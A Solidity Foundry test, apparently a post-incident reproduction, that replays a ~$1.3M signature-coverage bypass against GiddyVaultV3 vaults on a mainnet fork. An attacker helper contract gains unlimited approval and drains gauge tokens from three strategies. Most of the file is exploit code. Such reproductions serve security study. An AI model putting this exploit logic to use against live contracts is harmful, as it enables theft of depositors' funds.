// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$1.3M
// Attacker : 0x81fe3d7d35dfefa15b9e6800b6aefc3358e7b156
// Attack Contract : 0x7326a1ab0d696ae317958d136d6e4c693ea34528
// Attack Deployer : 0x50a5312bf627b6be07e60015ed3d418e992d76eb
// Vulnerable Contract : 0x5f0ad32c00641d1d2bb628ff341e0d4bb4494318
// Attack Tx : https://etherscan.io/tx/0x5edb66a4c2ea55bba95d36d27713e3bb1c67c3c4199a8a1759e754c6f25482e5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x5f0ad32c00641d1d2bb628ff341e0d4bb4494318#code

// @Analysis
// Twitter guy : https://x.com/DefimonAlerts/status/2047334517535642024
//
// GiddyVaultV3 validates EIP-712 compound authorizations using only keccak256(SwapInfo.data).
// The attacker reused valid signed data while replacing fromToken, toToken, amount, and aggregator.
// Each compound call made a strategy approve the attacker helper for uint256.max, after which the
// helper drained the strategy-held YieldBasis gauge tokens to the attacker.

address constant ATTACKER = 0x81Fe3D7d35dFeFa15b9E6800B6aeFC3358E7b156;

address constant VAULT_TBTC = 0x9C247ccd24c23EDDBA399701CDA24051EBF605b7;
address constant VAULT_CBBTC = 0x51b9E3e9871247Ed7C2f07539B99CB97Ae99d080;
address constant VAULT_WBTC = 0x1D85E7BceAC3605d469debE006b46E9062238e67;

address constant STRATEGY_TBTC = 0xC99FC715E73294FD03B7C09d9a438A98F6C76ec3;
address constant STRATEGY_CBBTC = 0x0d5e628A44E7Ec94a2054A6c454127cfe5FcB690;
address constant STRATEGY_WBTC = 0x870fcD63DB2c68D8079166E311b1118B8aA26eD7;

address constant YB_TBTC_GAUGE = 0x30ba8b27F2128c770B90C965FF671E08b9310D21;
address constant YB_CBBTC_GAUGE = 0xf3081A2eB8927C0462864EC3FdbE927C842A0893;
address constant YB_WBTC_GAUGE = 0xbc56e3edB67b56d598aCE07668b138815F45d7aa;

uint256 constant TEST_SIGNER_KEY = 0xA11CE;
bytes32 constant VAULTAUTH_TYPEHASH =
    keccak256("VaultAuth(bytes32 nonce,uint256 deadline,uint256 amount,bytes[] data)");

struct SwapInfo {
    address fromToken;
    address toToken;
    uint256 amount;
    address aggregator;
    bytes data;
}

struct VaultAuth {
    bytes signature;
    bytes32 nonce;
    uint256 deadline;
    uint256 amount;
    SwapInfo[] vaultSwaps;
    SwapInfo[] compoundSwaps;
}

interface IGiddyVaultV3 {
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function compound(
        VaultAuth calldata auth
    ) external;
}

interface IGiddyBaseStrategyV3 {
    function factory() external view returns (address);
}

interface IGiddyStrategyFactory {
    function owner() external view returns (address);

    function setAuthorizedSigner(
        address authorizedSigner,
        bool authorized
    ) external;

    function isAuthorizedSigner(
        address signer
    ) external view returns (bool);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_942_491;
        vm.createSelectFork("mainnet", forkBlock);

        attacker = ATTACKER;
        fundingToken = YB_TBTC_GAUGE;
        multiAssetLog = true;
        _addFundingToken(YB_TBTC_GAUGE);
        _addFundingToken(YB_CBBTC_GAUGE);
        _addFundingToken(YB_WBTC_GAUGE);

        // Test setup creates valid Giddy signatures without embedding historical router calldata.
        authorizeTestSigner(STRATEGY_TBTC);
        authorizeTestSigner(STRATEGY_CBBTC);
        authorizeTestSigner(STRATEGY_WBTC);

        vm.label(ATTACKER, "Attacker");
        vm.label(VAULT_TBTC, "Giddy YieldBasis tBTC Vault");
        vm.label(VAULT_CBBTC, "Giddy YieldBasis cbBTC Vault");
        vm.label(VAULT_WBTC, "Giddy YieldBasis WBTC V2 Vault");
        vm.label(STRATEGY_TBTC, "Giddy tBTC Strategy");
        vm.label(STRATEGY_CBBTC, "Giddy cbBTC Strategy");
        vm.label(STRATEGY_WBTC, "Giddy WBTC Strategy");
        vm.label(YB_TBTC_GAUGE, "g(yb-tBTC)");
        vm.label(YB_CBBTC_GAUGE, "g(yb-cbBTC)");
        vm.label(YB_WBTC_GAUGE, "g(yb-WBTC)");
        vm.label(vm.addr(TEST_SIGNER_KEY), "Local Authorized Signer");
    }

    function testExploit() public balanceLog {
        vm.startPrank(ATTACKER);
        AttackHelper helper = new AttackHelper();
        address helperAddress = address(helper);
        vm.label(helperAddress, "Attack Helper / Fake Token");

        uint256 tbtcBefore = IERC20(YB_TBTC_GAUGE).balanceOf(ATTACKER);
        uint256 cbBtcBefore = IERC20(YB_CBBTC_GAUGE).balanceOf(ATTACKER);
        uint256 wbtcBefore = IERC20(YB_WBTC_GAUGE).balanceOf(ATTACKER);

        // step 1: submit a valid tBTC compound signature with attacker-controlled swap fields.
        address[] memory tbtcFakeSwaps = new address[](1);
        tbtcFakeSwaps[0] = YB_TBTC_GAUGE;
        helper.run(VAULT_TBTC, STRATEGY_TBTC, YB_TBTC_GAUGE, buildTbtcAuth(helperAddress), tbtcFakeSwaps);

        // step 2: repeat the same signature-coverage bypass for the cbBTC vault.
        address[] memory cbBtcFakeSwaps = new address[](2);
        cbBtcFakeSwaps[0] = YB_CBBTC_GAUGE;
        cbBtcFakeSwaps[1] = YB_CBBTC_GAUGE;
        helper.run(VAULT_CBBTC, STRATEGY_CBBTC, YB_CBBTC_GAUGE, buildCbBtcAuth(helperAddress), cbBtcFakeSwaps);

        // step 3: repeat against the WBTC V2 vault and keep the drained gauge tokens at the attacker EOA.
        address[] memory wbtcFakeSwaps = new address[](2);
        wbtcFakeSwaps[0] = YB_WBTC_GAUGE;
        wbtcFakeSwaps[1] = YB_WBTC_GAUGE;
        helper.run(VAULT_WBTC, STRATEGY_WBTC, YB_WBTC_GAUGE, buildWbtcAuth(helperAddress), wbtcFakeSwaps);

        vm.stopPrank();

        assertGt(IERC20(YB_TBTC_GAUGE).balanceOf(ATTACKER) - tbtcBefore, 3 ether);
        assertGt(IERC20(YB_CBBTC_GAUGE).balanceOf(ATTACKER) - cbBtcBefore, 6 ether);
        assertGt(IERC20(YB_WBTC_GAUGE).balanceOf(ATTACKER) - wbtcBefore, 6 ether);
    }

    function buildTbtcAuth(
        address helperAddress
    ) internal returns (VaultAuth memory auth) {
        auth.nonce = keccak256(bytes("tx2poc:giddy:tbtc"));
        auth.deadline = block.timestamp + 1 days;
        auth.vaultSwaps = new SwapInfo[](0);
        auth.compoundSwaps = new SwapInfo[](1);
        auth.compoundSwaps[0] = drainSwap(YB_TBTC_GAUGE, helperAddress);
        auth.signature = signAuth(VAULT_TBTC, auth);
    }

    function buildCbBtcAuth(
        address helperAddress
    ) internal returns (VaultAuth memory auth) {
        auth.nonce = keccak256(bytes("tx2poc:giddy:cbbtc"));
        auth.deadline = block.timestamp + 1 days;
        auth.vaultSwaps = new SwapInfo[](0);
        auth.compoundSwaps = new SwapInfo[](2);
        auth.compoundSwaps[0] = drainSwap(YB_CBBTC_GAUGE, helperAddress);
        auth.compoundSwaps[1] = drainSwap(YB_CBBTC_GAUGE, helperAddress);
        auth.signature = signAuth(VAULT_CBBTC, auth);
    }

    function buildWbtcAuth(
        address helperAddress
    ) internal returns (VaultAuth memory auth) {
        auth.nonce = keccak256(bytes("tx2poc:giddy:wbtc"));
        auth.deadline = block.timestamp + 1 days;
        auth.vaultSwaps = new SwapInfo[](0);
        auth.compoundSwaps = new SwapInfo[](2);
        auth.compoundSwaps[0] = drainSwap(YB_WBTC_GAUGE, helperAddress);
        auth.compoundSwaps[1] = drainSwap(YB_WBTC_GAUGE, helperAddress);
        auth.signature = signAuth(VAULT_WBTC, auth);
    }

    function drainSwap(
        address gaugeToken,
        address helperAddress
    ) internal pure returns (SwapInfo memory swap) {
        swap = SwapInfo({
            fromToken: gaugeToken,
            toToken: helperAddress,
            amount: type(uint256).max,
            aggregator: helperAddress,
            data: abi.encodeCall(AttackHelper.fakeSwap, ())
        });
    }

    function signAuth(
        address vault,
        VaultAuth memory auth
    ) internal returns (bytes memory signature) {
        bytes memory dataArray;
        for (uint256 i = 0; i < auth.vaultSwaps.length; ++i) {
            dataArray = abi.encodePacked(dataArray, keccak256(auth.vaultSwaps[i].data));
        }
        for (uint256 i = 0; i < auth.compoundSwaps.length; ++i) {
            dataArray = abi.encodePacked(dataArray, keccak256(auth.compoundSwaps[i].data));
        }

        bytes32 structHash = keccak256(
            abi.encodePacked(
                VAULTAUTH_TYPEHASH, abi.encode(auth.nonce, auth.deadline, auth.amount, keccak256(dataArray))
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", IGiddyVaultV3(vault).DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TEST_SIGNER_KEY, digest);
        signature = abi.encodePacked(r, s, v);
    }

    function authorizeTestSigner(
        address strategy
    ) internal {
        address factory = IGiddyBaseStrategyV3(strategy).factory();
        address signer = vm.addr(TEST_SIGNER_KEY);
        if (!IGiddyStrategyFactory(factory).isAuthorizedSigner(signer)) {
            vm.prank(IGiddyStrategyFactory(factory).owner());
            IGiddyStrategyFactory(factory).setAuthorizedSigner(signer, true);
        }
        assertTrue(IGiddyStrategyFactory(factory).isAuthorizedSigner(signer));
        vm.label(factory, "Giddy Strategy Factory");
    }
}

contract AttackHelper {
    event Transfer(address indexed from, address indexed to, uint256 amount);

    mapping(address => uint256) public balanceOf;
    address[] private queuedSwapTokens;
    uint256 private queuedSwapIndex;

    function run(
        address vault,
        address strategy,
        address profitToken,
        VaultAuth calldata auth,
        address[] calldata fakeSwapTokens
    ) external {
        delete queuedSwapTokens;
        for (uint256 i = 0; i < fakeSwapTokens.length; ++i) {
            queuedSwapTokens.push(fakeSwapTokens[i]);
        }
        queuedSwapIndex = 0;

        IGiddyVaultV3(vault).compound(auth);
        require(queuedSwapIndex == fakeSwapTokens.length, "fake swaps unused");
        delete queuedSwapTokens;

        uint256 strategyBalance = IERC20(profitToken).balanceOf(strategy);
        uint256 approved = IERC20(profitToken).allowance(strategy, address(this));
        uint256 amountToDrain = strategyBalance < approved ? strategyBalance : approved;
        require(amountToDrain > 0, "nothing to drain");
        IERC20(profitToken).transferFrom(strategy, msg.sender, amountToDrain);
    }

    function fakeSwap() external {
        fakeSwapMarker();
    }

    fallback() external payable {
        fakeSwapMarker();
    }

    receive() external payable {}

    function fakeSwapMarker() internal {
        require(queuedSwapIndex < queuedSwapTokens.length, "unexpected swap");
        address token = queuedSwapTokens[queuedSwapIndex++];

        IERC20(token).transferFrom(msg.sender, address(this), 1);
        balanceOf[msg.sender] += 1;
        emit Transfer(address(0), msg.sender, 1);
    }
}
